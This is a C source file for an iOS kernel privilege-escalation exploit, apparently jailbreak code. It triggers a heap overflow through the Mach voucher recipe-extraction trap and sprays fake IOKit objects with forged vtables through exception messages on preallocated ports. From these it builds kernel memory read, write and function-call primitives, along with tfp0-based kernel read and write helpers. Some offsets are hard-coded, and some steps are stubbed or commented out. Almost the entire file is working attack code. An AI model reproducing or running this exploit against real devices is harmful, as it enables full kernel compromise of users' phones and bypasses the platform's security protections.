#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/time.h>
#include <pthread.h>

#include <mach/mach.h>
#include <mach/mach_error.h>
#include <mach/mach_port.h>
#include <mach/mach_time.h>
#include <mach/mach_traps.h>

#include <mach/mach_voucher_types.h>
#include <mach/port.h>

#include <CoreFoundation/CoreFoundation.h>


// IOKit stuff

#define kIOMasterPortDefault MACH_PORT_NULL
#define IO_OBJECT_NULL MACH_PORT_NULL

typedef mach_port_t io_iterator_t;
typedef mach_port_t io_service_t;
typedef mach_port_t io_connect_t;
typedef mach_port_t io_object_t;
typedef    char io_name_t[128];


CFMutableDictionaryRef
IOServiceMatching(const char* name );

kern_return_t
IOServiceGetMatchingServices(
                             mach_port_t masterPort,
                             CFDictionaryRef matching,
                             io_iterator_t * existing );

io_service_t
IOServiceGetMatchingService(
                            mach_port_t    masterPort,
                            CFDictionaryRef    matching);

io_object_t
IOIteratorNext(
               io_iterator_t    iterator );

kern_return_t
IOObjectGetClass(
                 io_object_t    object,
                 io_name_t    className );

kern_return_t
IOServiceOpen(
              io_service_t    service,
              task_port_t    owningTask,
              uint32_t    type,
              io_connect_t  *    connect );

kern_return_t
IOServiceClose(
               io_connect_t    connect );

kern_return_t
IOObjectRelease(
                io_object_t    object );

kern_return_t
IOConnectGetService(
                    io_connect_t    connect,
                    io_service_t  *    service );

// mach_vm protos

kern_return_t mach_vm_allocate
(
 vm_map_t target,
 mach_vm_address_t *address,
 mach_vm_size_t size,
 int flags
 );

kern_return_t mach_vm_deallocate
(
 vm_map_t target,
 mach_vm_address_t address,
 mach_vm_size_t size
 );



mach_port_t prealloc_port(int size) {
    kern_return_t err;
    mach_port_qos_t qos = {0};
    qos.prealloc = 1;
    qos.len = size;
    
    mach_port_name_t name = MACH_PORT_NULL;
    
    err = mach_port_allocate_full(mach_task_self(),
                                  MACH_PORT_RIGHT_RECEIVE,
                                  MACH_PORT_NULL,
                                  &qos,
                                  &name);
    
    if (err != KERN_SUCCESS) {
        printf("pre-allocated port allocation failed: %s\n", mach_error_string(err));
        return MACH_PORT_NULL;
    }
    
    return (mach_port_t)name;
}


io_service_t service = MACH_PORT_NULL;

io_connect_t alloc_userclient() {
    kern_return_t err;
    if (service == MACH_PORT_NULL) {
        service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AGXAccelerator"));
        
        if (service == IO_OBJECT_NULL){
            printf("unable to find service\n");
            return 0;
        }
    }
    
    io_connect_t conn = MACH_PORT_NULL;
    err = IOServiceOpen(service, mach_task_self(), 5, &conn); // AGXCommandQueue, 0xdb8
    if (err != KERN_SUCCESS){
        printf("unable to get user client connection\n");
        return 0;
    }
    
    return conn;
}

#define MACH_VOUCHER_ATTR_ATM_CREATE ((mach_voucher_attr_recipe_command_t)510)

mach_port_t get_voucher() {
    mach_voucher_attr_recipe_data_t r = {
        .key = MACH_VOUCHER_ATTR_KEY_ATM,
        .command = MACH_VOUCHER_ATTR_ATM_CREATE
    };
    static mach_port_t p = MACH_PORT_NULL;
    
    if (p != MACH_PORT_NULL) {
        return p;
    }
    
    kern_return_t err = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&r, sizeof(r), &p);
    
    if (err != KERN_SUCCESS) {
        printf("failed to create voucher (%s)\n", mach_error_string(err));
    }
    printf("got voucher: %x\n", p);
    
    return p;
}

uint64_t map_fixed(uint64_t addr, uint64_t size) {
    uint64_t _addr = addr;
    kern_return_t err = mach_vm_allocate(mach_task_self(), &_addr, size, 0);
    if (err != KERN_SUCCESS || _addr != addr) {
        printf("failed to allocate fixed mapping: %s\n", mach_error_string(err));
    }
    return addr;
}

uint64_t map(uint64_t size) {
    uint64_t addr = 0;
    kern_return_t err = mach_vm_allocate(mach_task_self(), &addr, size, VM_FLAGS_ANYWHERE);
    if (err != KERN_SUCCESS) {
        printf("failed to allocate mapping: %s\n", mach_error_string(err));
    }
    return addr;
}

void unmap(uint64_t addr, uint64_t size) {
    kern_return_t err = mach_vm_deallocate(mach_task_self(), addr, size);
    if (err != KERN_SUCCESS) {
        printf("failed to unmap memory\n");
    }
    printf("unmap: %s\n", mach_error_string(err));
}

uint64_t roundup(uint64_t val, uint64_t pagesize) {
    val += pagesize - 1;
    val &= ~(pagesize - 1);
    return val;
}

void do_overflow(uint64_t kalloc_size, uint64_t overflow_length, uint8_t* overflow_data) {
    int pagesize = getpagesize();
    printf("pagesize: 0x%x\n", pagesize);
    
    
    // recipe_size will be used first as a pointer to a length to pass to kalloc
    // and then as a length (the userspace pointer will be used as a length)
    // it has to be a low address to pass the checks which make sure the copyin will stay in userspace
    
    // iOS has a hard coded check for copyin > 0x4000001:
    // this xcodeproj sets pagezero_size 0x16000 so we can allocate this low
    static uint64_t small_pointer_base = 0x3000000;
    static int mapped = 0;
    void* recipe_size = (void*)small_pointer_base;
    if (!mapped) {
        recipe_size = (void*)map_fixed(small_pointer_base, pagesize);
        mapped = 1;
    }
    *(uint64_t*)recipe_size = kalloc_size; // the kernel allocation size
    
    // this is how much data we want copyin to actually copy
    // we make sure it only copies this much by aligning the userspace buffer
    // such that after this many bytes there's an unmapped userspace page and the copyin stops and fails
    uint64_t actual_copy_size = kalloc_size + overflow_length;
    
    uint64_t alloc_size = roundup(actual_copy_size, pagesize) + pagesize; // want a page after to unmap
    
    uint64_t base = map(alloc_size);
    
    // unmap the page at the end so we can terminate the copy
    uint64_t end = base + roundup(actual_copy_size, pagesize);
    unmap(end, pagesize);
    
    // subtract the copy size from the end pointer to get the start so the last copy byte is right before the unmapped page:
    uint64_t start = end - actual_copy_size;
    
    // fill in the data to copy:
    uint8_t* recipe = (uint8_t*)start;
    
    memset(recipe, 0x41, kalloc_size);
    memcpy(recipe+kalloc_size, overflow_data, overflow_length);
    
    // trigger the bug!
    mach_port_t port = get_voucher();
    mach_voucher_extract_attr_recipe_trap(port, 1, recipe, recipe_size);
}

kern_return_t catch_exception_raise
(
 mach_port_t exception_port,
 mach_port_t thread,
 mach_port_t task,
 exception_type_t exception,
 exception_data_t code,
 mach_msg_type_number_t codeCnt
 )
{
    // shouldn't reach
    //printf("catch_exception_raise\n");
    return KERN_FAILURE;
}

uint8_t* crash_stack = NULL;

// each time we get an exception message copy the first 32 registers into this buffer
uint64_t crash_buf[32] = {0}; // use the 32 general purpose ARM64 registers

kern_return_t catch_exception_raise_state
(
 mach_port_t exception_port,
 exception_type_t exception,
 const exception_data_t code,
 mach_msg_type_number_t codeCnt,
 int *flavor,
 const thread_state_t old_state,
 mach_msg_type_number_t old_stateCnt,
 thread_state_t new_state,
 mach_msg_type_number_t *new_stateCnt
 )
{
    //printf("catch_exception_raise_state\n");
    memcpy(crash_buf, old_state, sizeof(crash_buf));
    
    // make the thread exit:
    memset(new_state, 0, sizeof(_STRUCT_ARM_THREAD_STATE64));
    _STRUCT_ARM_THREAD_STATE64* new = (_STRUCT_ARM_THREAD_STATE64*)(new_state);
    
    // it needs a minimal stack:
    if (!crash_stack) {
        crash_stack = malloc(0x4000);
        crash_stack += 0x3ff0;
    }
    
    *new_stateCnt = old_stateCnt;
    
    new->__pc = (uint64_t)pthread_exit;
    new->__x[0] = 0;
    new->__sp = (uint64_t)crash_stack;
    
    return KERN_SUCCESS;
}

kern_return_t catch_exception_raise_state_identity
(
 mach_port_t exception_port,
 mach_port_t thread,
 mach_port_t task,
 exception_type_t exception,
 exception_data_t code,
 mach_msg_type_number_t codeCnt,
 int *flavor,
 thread_state_t old_state,
 mach_msg_type_number_t old_stateCnt,
 thread_state_t new_state,
 mach_msg_type_number_t *new_stateCnt
 )
{
    // shouldn't reach
    //printf("catch_exception_raise_state_identity\n");
    return KERN_FAILURE;
}

union max_msg {
    union __RequestUnion__exc_subsystem requests;
    union __ReplyUnion__exc_subsystem replies;
};

extern boolean_t exc_server(mach_msg_header_t *InHeadP, mach_msg_header_t *OutHeadP);


// (actually only 30 controlled qwords for the send)
struct thread_args {
    uint64_t buf[32];
    mach_port_t exception_port;
};

void* do_thread(void* arg) {
    struct thread_args* args = (struct thread_args*)arg;
    uint64_t buf[32];
    memcpy(buf, args->buf, sizeof(buf));
    
    kern_return_t err;
    err = thread_set_exception_ports(
                                     mach_thread_self(),
                                     EXC_MASK_ALL,
                                     args->exception_port,
                                     EXCEPTION_STATE, // we want to receive a catch_exception_raise_state message
                                     ARM_THREAD_STATE64);
    
    free(args);
    
    printf("no crashy?");
    return NULL;
}

void prepare_prealloc_port(mach_port_t port) {
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
}

int port_has_message(mach_port_t port) {
    kern_return_t err;
    mach_port_seqno_t msg_seqno = 0;
    mach_msg_size_t msg_size = 0;
    mach_msg_id_t msg_id = 0;
    mach_msg_trailer_t msg_trailer; // NULL trailer
    mach_msg_type_number_t msg_trailer_size = sizeof(msg_trailer);
    err = mach_port_peek(mach_task_self(),
                         port,
                         MACH_RCV_TRAILER_NULL,
                         &msg_seqno,
                         &msg_size,
                         &msg_id,
                         (mach_msg_trailer_info_t)&msg_trailer,
                         &msg_trailer_size);
    
    return (err == KERN_SUCCESS);
}

// port needs to have a send right
void send_prealloc_msg(mach_port_t port, uint64_t* buf, int n) {
    struct thread_args* args = malloc(sizeof(struct thread_args));
    memset(args, 0, sizeof(struct thread_args));
    memcpy(args->buf, buf, n*8);
    
    args->exception_port = port;
    
    // start a new thread passing it the buffer and the exception port
    pthread_t t;
    pthread_create(&t, NULL, do_thread, (void*)args);
    
    // associate the pthread_t with the port so that we can join the correct pthread
    // when we receive the exception message and it exits:
    kern_return_t err = mach_port_set_context(mach_task_self(), port, (mach_port_context_t)t);
    
    if(err != KERN_SUCCESS) {
        printf("[ERROR]: failed setting the context pointer\n");
    }
    
    printf("set context\n");
    // wait until the message has actually been sent:
    while(!port_has_message(port)){;}
    printf("message was sent\n");
}

// the returned pointer is only valid until the next call to this function
// ownership is retained by this function
uint64_t* receive_prealloc_msg(mach_port_t port) {
    kern_return_t err = mach_msg_server_once(exc_server,
                                             sizeof(union max_msg),
                                             port,
                                             MACH_MSG_TIMEOUT_NONE);
    
    printf("receive_prealloc_msg: %s\n", mach_error_string(err));
    
    // get the pthread context back from the port and join it:
    pthread_t t;
    err = mach_port_get_context(mach_task_self(), port, (mach_port_context_t*)&t);
    pthread_join(t, NULL);
    
    return &crash_buf[0];
}



uint64_t kaslr_shift = 0;
uint64_t get_metaclass = 0;
uint64_t osserializer_serialize = 0;
uint64_t ret = 0;
uint64_t kernel_uuid_copy = 0;

uint64_t kernel_buffer_base = 0;

uint64_t legit_object[32];


mach_port_t oob_port = MACH_PORT_NULL;
mach_port_t target_uc = MACH_PORT_NULL;

// the actual read primitive
typedef struct _uint128_t {
    uint64_t lower;
    uint64_t upper;
} uint128_t;

uint128_t rk128(uint64_t address) {
    uint64_t r_obj[11];
    r_obj[0] = kernel_buffer_base+0x8;  // fake vtable points 8 bytes into this object
    r_obj[1] = 0x20003;                 // refcount
    r_obj[2] = kernel_buffer_base+0x48; // obj + 0x10 -> rdi (memmove dst)
    r_obj[3] = address;                 // obj + 0x18 -> rsi (memmove src)
    r_obj[4] = 0xFFFFFFF00746651C - 0xFFFFFFF00605C000; // TODO REPLACE WITH OFFSETS       // obj + 0x20 -> fptr
    r_obj[5] = ret;                     // vtable + 0x20 (::retain)
    r_obj[6] = 0xfffffff00744df80 - 0xFFFFFFF00605C000;  // vtable + 0x28 (::release)
    r_obj[7] = 0x0;                     //
    r_obj[8] = 0xFFFFFFF007444700 - 0xFFFFFFF00605C000;           // vtable + 0x38 (::getMetaClass)
    r_obj[9] = 0;                       // r/w buffer
    r_obj[10] = 0;
    
    send_prealloc_msg(oob_port, r_obj, 11);
    
    io_service_t service = MACH_PORT_NULL;
    printf("fake_obj: 0x%x\n", target_uc);
    kern_return_t err = IOConnectGetService(target_uc, &service);
    
    if(err != KERN_SUCCESS) {
        printf("[ERROR]: couldn't connect to service\n");
    }
    
    uint64_t* out = receive_prealloc_msg(oob_port);
    uint128_t value = {out[9], out[10]};
    
    send_prealloc_msg(oob_port, legit_object, 30);
    receive_prealloc_msg(oob_port);
    
    return value;
}

void wk128(uint64_t address, uint128_t value) {
    uint64_t r_obj[11];
    r_obj[0] = kernel_buffer_base+0x8;  // fake vtable points 8 bytes into this object
    r_obj[1] = 0x20003;                 // refcount
    r_obj[2] = address;                 // obj + 0x10 -> rdi (memmove dst)
    r_obj[3] = kernel_buffer_base+0x48; // obj + 0x18 -> rsi (memmove src)
    r_obj[4] = kernel_uuid_copy;        // obj + 0x20 -> fptr
    r_obj[5] = ret;                     // vtable + 0x20 (::retain)
    r_obj[6] = osserializer_serialize;  // vtable + 0x28 (::release)
    r_obj[7] = 0x0;                     //
    r_obj[8] = get_metaclass;           // vtable + 0x38 (::getMetaClass)
    r_obj[9] = value.lower;             // r/w buffer
    r_obj[10] = value.upper;
    
    send_prealloc_msg(oob_port, r_obj, 11);
    
    io_service_t service = MACH_PORT_NULL;
    printf("fake_obj: 0x%x\n", target_uc);
    kern_return_t err = IOConnectGetService(target_uc, &service);
    
    if(err != KERN_SUCCESS) {
        printf("[ERROR]: failed connecting to service\n");
    }
    
    receive_prealloc_msg(oob_port);
    
    send_prealloc_msg(oob_port, legit_object, 30);
    receive_prealloc_msg(oob_port);
    
    return;
}



int jb_go() {
    //  int rv = init_extra_offsets();
    //  if (rv) return rv;
    //  uint64_t kernel_base = prepare_kernel_rw();
#if 0
    uint64_t val = rk64(kernel_base);
    printf("read from kernel memory: 0x%016llx\n", val);
    
    uint64_t test_val = 0x41424344abcdef;
    wk64(kernel_buffer_base+0xfe0, test_val);
    uint64_t read_back = rk64(kernel_buffer_base+0xfe0);
    
    printf("wrote: 0x%016llx\n", test_val);
    printf("read back: 0x%016llx\n", read_back);
    
    return 42;
#else
    //  extern int unjail(void);
    //  return kernel_base ? unjail() : -1;
    return 0;
#endif
}

/*****************************************************************************/


mach_port_t tfp0 = MACH_PORT_NULL;

//static uint64_t our_proc = 0;
//static uint64_t init_proc = 0;
//static uint64_t kern_proc = 0;
//static uint64_t kern_task = 0;

kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);

size_t
kread(uint64_t where, void *p, size_t size)
{
    
    if(tfp0 == MACH_PORT_NULL) {
        printf("[ERROR]: tfp0's port is null!\n");
    }
    
    int rv;
    size_t offset = 0;
    while (offset < size) {
        mach_vm_size_t sz, chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_read_overwrite(tfp0, where + offset, chunk, (mach_vm_address_t)p + offset, &sz);
        
        if (rv || sz == 0) {
            printf("[ERROR]: error reading buffer at @%p\n", (void *)(offset + where));
            break;
        }
        offset += sz;
    }
    return offset;
}

uint64_t
kread_uint64(uint64_t where)
{
    uint64_t value = 0;
    size_t sz = kread(where, &value, sizeof(value));
    return (sz == sizeof(value)) ? value : 0;
}

uint32_t
kread_uint32(uint64_t where)
{
    uint32_t value = 0;
    size_t sz = kread(where, &value, sizeof(value));
    return (sz == sizeof(value)) ? value : 0;
}

size_t
kwrite(uint64_t where, const void *p, size_t size)
{
    
    if(tfp0 == MACH_PORT_NULL) {
        printf("[ERROR]: tfp0's port is null!\n");
    }
    
    int rv;
    size_t offset = 0;
    while (offset < size) {
        size_t chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_write(tfp0, where + offset, (mach_vm_offset_t)p + offset, (mach_msg_type_number_t)chunk);
        if (rv) {
            printf("[ERROR]: error copying buffer into region: @%p\n", (void *)(offset + where));
            break;
        }
        offset += chunk;
    }
    return offset;
}

size_t
kwrite_uint64(uint64_t where, uint64_t value)
{
    return kwrite(where, &value, sizeof(value));
}

size_t
kwrite_uint32(uint64_t where, uint32_t value)
{
    return kwrite(where, &value, sizeof(value));
}

void kx2(uint64_t fptr, uint64_t arg1, uint64_t arg2) {
    uint64_t r_obj[9];
    r_obj[0] = kernel_buffer_base+0x8;  // fake vtable points 8 bytes into this object
    r_obj[1] = 0x20003;                 // refcount
    r_obj[2] = arg1;                    // obj + 0x10 -> rdi (memmove dst)
    r_obj[3] = arg2;                    // obj + 0x18 -> rsi (memmove src)
    r_obj[4] = fptr;                    // obj + 0x20 -> fptr
    r_obj[5] = ret;                     // vtable + 0x20 (::retain)
    r_obj[6] = osserializer_serialize;  // vtable + 0x28 (::release)
    r_obj[7] = 0x0;                     //
    r_obj[8] = get_metaclass;           // vtable + 0x38 (::getMetaClass)
    
    kwrite(kernel_buffer_base, r_obj, sizeof(r_obj));
    
    io_service_t service = MACH_PORT_NULL;
    IOConnectGetService(target_uc, &service);
    
    kwrite(kernel_buffer_base, legit_object, sizeof(r_obj));
}


// Not really used
int
unjail(uint64_t main_kbase, uint64_t kbase_buffer)
{
    
    extern uint64_t rk64(uint64_t kaddr);
    extern uint64_t wk64(uint64_t kaddr, uint64_t val);
    kernel_buffer_base = kbase_buffer;
    uint64_t val = rk64(main_kbase);
    printf("[INFO]: read from kernel memory: 0x%016llx\n", val);
    uint64_t test_val = 0x41424344abcdef;
    wk64(kernel_buffer_base+0xfe0, test_val);
    uint64_t read_back = rk64(kernel_buffer_base+0xfe0);
    
    printf("wrote: 0x%016llx\n", test_val);
    printf("read back: 0x%016llx\n", read_back);
    
    return 0;
}

